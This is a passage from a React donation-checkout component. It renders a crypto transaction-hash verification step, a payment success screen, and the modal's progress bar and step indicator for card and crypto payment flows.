  // Step 5: Crypto Verification
  const renderStep5 = () => (
    <div className="checkout-step">
      <h2>Verify Your Payment</h2>
      <p className="step-description">Enter your transaction hash to verify the donation</p>
      
      <div className="verification-section">
        <div className="security-badge">
          <FaShieldAlt />
          <span>Secure Verification</span>
        </div>
        
        <div className="transaction-input">
          <label>Transaction Hash (TXID):</label>
          <input
            type="text"
            placeholder="Enter your transaction hash here..."
            value={transactionHash}
            onChange={(e) => setTransactionHash(e.target.value)}
            className="transaction-hash-input"
          />
          <p className="input-help">You can find this in your wallet's transaction history</p>
        </div>
        
        {paymentVerified && (
          <div className="verification-success">
            <FaCheck />
            <span>Payment verified successfully!</span>
          </div>
        )}
        
        <button 
          className="verify-btn"
          onClick={handleTransactionSubmit}
          disabled={!transactionHash || transactionHash.length < 10}
        >
          Verify Payment
        </button>
        
        <div className="verification-info">
          <h4>How verification works:</h4>
          <ul>
            <li>We check the blockchain for your transaction</li>
            <li>Verify the amount and recipient address</li>
            <li>Confirm transaction has sufficient confirmations</li>
            <li>Process typically takes 30-60 seconds</li>
          </ul>
        </div>
      </div>
    </div>
  );

  // Step 6: Payment Success
  const renderStep6 = () => (
    <div className="checkout-step success-step">
      <div className="success-icon">✓</div>
      <h2>Payment Successful!</h2>
      <p className="success-message">
        Thank you for your generous donation of ${donationAmount} to {campaign.title}
      </p>
      
      <div className="transaction-details">
        <h4>Transaction Details:</h4>
        <div className="detail-item">
          <span>Amount:</span>
          <span>${donationAmount} USD</span>
        </div>
        <div className="detail-item">
          <span>Payment Method:</span>
          <span>{selectedPaymentMethod === 'card' ? 'Credit/Debit Card' : selectedCrypto.toUpperCase()}</span>
        </div>
        <div className="detail-item">
          <span>Status:</span>
          <span className="status-confirmed">Completed</span>
        </div>
        <div className="detail-item">
          <span>Email:</span>
          <span>{accountInfo.email}</span>
        </div>
      </div>
      
      <div className="success-actions">
        <button className="receipt-btn">Download Receipt</button>
        <button className="share-btn">Share This Campaign</button>
        <button className="close-btn" onClick={onPaymentComplete}>
          Return to Campaign
        </button>
      </div>
    </div>
  );

  const getCurrentStepContent = () => {
    switch (step) {
      case 1: return renderStep1();
      case 2: return renderStep2();
      case 3: return renderStep3();
      case 4: return renderStep4();
      case 5: return renderStep5();
      case 6: return renderStep6();
      default: return renderStep1();
    }
  };

  const getStepNumber = () => {
    if (selectedPaymentMethod === 'crypto') {
      return step;
    } else if (selectedPaymentMethod === 'card') {
      if (step === 4) return 3; // Payment confirmation
      if (step === 6) return 4; // Success
    } else if (selectedPaymentMethod === 'link') {
      if (step === 3) return 2; // Account linking
    }
    return step;
  };

  const getTotalSteps = () => {
    if (selectedPaymentMethod === 'crypto') return 5;
    if (selectedPaymentMethod === 'card') return 4;
    if (selectedPaymentMethod === 'link') return 2;
    return 1;
  };

  return (
    <div className="payment-checkout-overlay">
      <div className="payment-checkout-modal">
        <div className="checkout-header">
          <button 
            className="back-button"
            onClick={step > 1 ? () => setStep(step - 1) : onClose}
          >
            ← Back
          </button>
          <h2>Complete Your Donation</h2>
          <button className="close-button" onClick={onClose}>×</button>
        </div>
        
        <div className="progress-bar">
          <div className="progress-fill" style={{ width: `${(getStepNumber() / getTotalSteps()) * 100}%` }}></div>
        </div>
        
        <div className="step-indicator">
          <div className={`step ${getStepNumber() >= 1 ? 'active' : ''}`}>
            <span>1</span>
            <label>Method</label>
          </div>
          <div className={`step ${getStepNumber() >= 2 ? 'active' : ''}`}>
            <span>2</span>
            <label>
              {selectedPaymentMethod === 'crypto' ? 'Select Crypto' : 
               selectedPaymentMethod === 'card' ? 'Link Account' : 
               'Link Account'}
            </label>
          </div>
          <div className={`step ${getStepNumber() >= 3 ? 'active' : ''}`}>
            <span>3</span>
            <label>
              {selectedPaymentMethod === 'crypto' ? 'Pay' : 
               selectedPaymentMethod === 'card' ? 'Confirm' : 
               'Complete'}
            </label>
          </div>
          {selectedPaymentMethod === 'crypto' && (
            <>
              <div className={`step ${getStepNumber() >= 4 ? 'active' : ''}`}>
                <span>4</span>
                <label>Verify</label>
              </div>
              <div className={`step ${getStepNumber() >= 5 ? 'active' : ''}`}>
                <span>5</span>
                <label>Complete</label>
              </div>
            </>
          )}
          {selectedPaymentMethod === 'card' && (
            <div className={`step ${getStepNumber() >= 4 ? 'active' : ''}`}>
              <span>4</span>
              <label>Complete</label>
            </div>
          )}
        </div>
        
        <div className="checkout-content">
          {getCurrentStepContent()}
        </div>
        
        <div className="security-notice">
          <FaShieldAlt />
          <span>All transactions are secured with SSL encryption</span>
        </div>
      </div>
    </div>
  );
};

export default PaymentCheckout;